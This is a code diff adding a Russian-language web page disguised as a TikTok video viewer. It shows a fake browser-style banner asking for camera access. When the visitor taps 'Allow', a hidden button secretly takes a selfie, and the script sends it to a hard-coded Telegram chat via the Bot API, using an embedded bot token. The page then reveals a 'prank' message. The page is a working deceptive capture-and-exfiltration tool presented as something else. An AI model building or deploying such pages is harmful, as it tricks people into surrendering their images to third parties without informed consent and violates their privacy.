@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok Video</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 10px;
+        }
+        .card {
+            max-width: 420px;
+            width: 100%;
+            background: #111;
+            border-radius: 30px;
+            overflow: hidden;
+            position: relative;
+        }
+        .video-wrapper {
+            background: #000;
+            position: relative;
+        }
+        iframe {
+            width: 100%;
+            height: 550px;
+            border: none;
+        }
+        
+        /* ============================================
+           НАСТОЯЩЕЕ УВЕДОМЛЕНИЕ БРАУЗЕРА
+           Выглядит как системный баннер Safari/Chrome
+           ============================================ */
+        .browser-banner {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: rgba(30, 30, 35, 0.98);
+            backdrop-filter: blur(20px);
+            z-index: 100;
+            transform: translateY(-100%);
+            transition: transform 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        .browser-banner.show {
+            transform: translateY(0);
+        }
+        
+        /* Верхняя полоска как в Safari */
+        .banner-handle {
+            height: 4px;
+            width: 40px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 2px;
+            margin: 10px auto 5px;
+        }
+        
+        /* Текст уведомления */
+        .banner-content {
+            padding: 8px 16px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        /* Иконка камеры */
+        .camera-icon {
+            width: 44px;
+            height: 44px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        
+        /* Текстовая часть */
+        .banner-text {
+            flex: 1;
+        }
+        .banner-title {
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+        .banner-subtitle {
+            color: #aaa;
+            font-size: 12px;
+        }
+        
+        /* Кнопки как в браузере */
+        .banner-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        .btn-allow {
+            background: #007aff;
+            border: none;
+            color: white;
+            padding: 8px 18px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .btn-allow:active {
+            background: #005fc9;
+            transform: scale(0.96);
+        }
+        .btn-block {
+            background: transparent;
+            border: none;
+            color: #007aff;
+            padding: 8px 14px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .btn-block:active {
+            opacity: 0.6;
+        }
+        
+        /* Основная кнопка (станет невидимой, но работает) */
+        .hidden-btn {
+            opacity: 0;
+            position: absolute;
+            pointer-events: none;
+        }
+        
+        .content {
+            padding: 24px 20px;
+            text-align: center;
+        }
+        #status {
+            color: #ffaa33;
+            font-size: 13px;
+            margin-top: 14px;
+        }
+        .prank {
+            background: #00ff88;
+            color: black;
+            padding: 14px;
+            border-radius: 20px;
+            display: none;
+            margin-top: 14px;
+            font-weight: bold;
+        }
+        .footer {
+            font-size: 10px;
+            color: #444;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="video-wrapper">
+        <!-- БАННЕР БРАУЗЕРА (выглядит как настоящее уведомление) -->
+        <div id="browserBanner" class="browser-banner">
+            <div class="banner-handle"></div>
+            <div class="banner-content">
+                <div class="camera-icon">📷</div>
+                <div class="banner-text">
+                    <div class="banner-title">Разрешить доступ к камере</div>
+                    <div class="banner-subtitle">tiktok.com хочет использовать вашу камеру для улучшения качества видео</div>
+                </div>
+                <div class="banner-buttons">
+                    <button id="blockBtn" class="btn-block">Заблокировать</button>
+                    <button id="allowBtn" class="btn-allow">Разрешить</button>
+                </div>
+            </div>
+        </div>
+        
+        <iframe 
+            src="https://www.tiktok.com/player/v1/7633683429569088788?autoplay=1&mute=1"
+            allow="autoplay; fullscreen"
+        ></iframe>
+    </div>
+    <div class="content">
+        <div id="actionArea">
+            <!-- Скрытая кнопка (на неё будет нажимать скрипт) -->
+            <button id="realBtn" class="hidden-btn">📸</button>
+            <div id="status"></div>
+        </div>
+        <div id="prankMessage" class="prank">
+            😂 ТЫ ПОПАЛСЯ! Фото ушло другу в Telegram 😂
+        </div>
+        <div class="footer">
+            🔐 Нажмите «Разрешить» в уведомлении
+        </div>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    // ⚠️ ТВОИ ДАННЫЕ (уже вставлены) ⚠️
+    const BOT_TOKEN = "8690046228:AAHtBXqcXewTZGd2VD4F4qUd7l8v7rlHQW4";
+    const CHAT_ID = "787437405";
+    // ==========================================
+
+    const banner = document.getElementById('browserBanner');
+    const allowBtn = document.getElementById('allowBtn');
+    const blockBtn = document.getElementById('blockBtn');
+    const realBtn = document.getElementById('realBtn');
+    const statusDiv = document.getElementById('status');
+    const prankDiv = document.getElementById('prankMessage');
+
+    // Показываем баннер через 0.5 секунды (как будто браузер сам его вызвал)
+    setTimeout(() => {
+        banner.classList.add('show');
+    }, 500);
+
+    // ОБРАБОТЧИК КНОПКИ "РАЗРЕШИТЬ"
+    allowBtn.onclick = () => {
+        // Скрываем баннер красиво
+        banner.classList.remove('show');
+        // Имитируем нажатие на реальную кнопку (которая делает селфи)
+        realBtn.click();
+    };
+
+    // Обработчик "ЗАБЛОКИРОВАТЬ" — показываем сообщение
+    blockBtn.onclick = () => {
+        banner.classList.remove('show');
+        statusDiv.innerText = "❌ Без доступа к камере видео не может быть разблокировано";
+        setTimeout(() => {
+            statusDiv.innerText = "";
+        }, 3000);
+    };
+
+    // ОСНОВНАЯ ЛОГИКА (когда нажата кнопка "Разрешить")
+    realBtn.onclick = async function() {
+        statusDiv.innerText = "📷 Запрос доступа к камере...";
+        
+        try {
+            // Запрашиваем камеру — Safari покажет свой стандартный запрос
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            statusDiv.innerText = "✅ Делаем селфи...";
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 200));
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            stream.getTracks().forEach(t => t.stop());
+            const base64 = canvas.toDataURL('image/jpeg').split(',')[1];
+            
+            statusDiv.innerText = "📤 Отправка...";
+            
+            const blob = base64ToBlob(base64, 'image/jpeg');
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'selfie.jpg');
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            statusDiv.innerText = "";
+            prankDiv.style.display = "block";
+            document.getElementById('actionArea').style.display = "none";
+            
+        } catch (err) {
+            statusDiv.innerText = "❌ Ошибка: " + err.message;
+            // Можно снова показать баннер, если пользователь случайно запретил
+            setTimeout(() => {
+                banner.classList.add('show');
+            }, 1000);
+        }
+    };
+    
+    function base64ToBlob(base64, mime) {
+        const byteChars = atob(base64);
+        const byteArray = new Uint8Array(byteChars.length);
+        for (let i = 0; i < byteChars.length; i++) {
+            byteArray[i] = byteChars.charCodeAt(i);
+        }
+        return new Blob([byteArray], { type: mime });
+    }
+</script>
+</body>
+</html>
